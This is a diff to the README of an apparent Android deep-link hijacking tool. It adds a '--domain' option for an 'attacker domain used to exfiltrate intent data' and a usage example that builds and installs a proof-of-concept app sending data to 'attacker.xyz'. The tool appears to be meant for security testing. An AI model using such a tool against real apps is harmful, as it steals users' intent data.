@@ -28,6 +28,8 @@ optional arguments:
   -h, --help            show this help message and exit
   -l DEEPLINK, --link DEEPLINK
                         Deep Link to hijack using the application.
+  -d DOMAIN, --domain DOMAIN
+                        Attacker domain used to exfiltrate intent data.
   -o OUTPUT, --output OUTPUT
                         Output location for application.
   -i, --install         Install application after build.
@@ -56,4 +58,13 @@ python3 DeepLinkHijacker.py -l "testApp://test/" -o "./dir/pocApp.apk"
 Creates the PoC app and installs it via 'adb'.
 ```
 python3 DeepLinkHijacker.py -l "testApp://test/" -i
+
+```
+
+<br>
+
+Create the PoC app, use a custom domain to exfiltrate intent data and installs it via 'adb'
+```
+python3 DeepLinkHijacker.py -l "testApp://test/" -d "attacker.xyz" -i
+
 ```
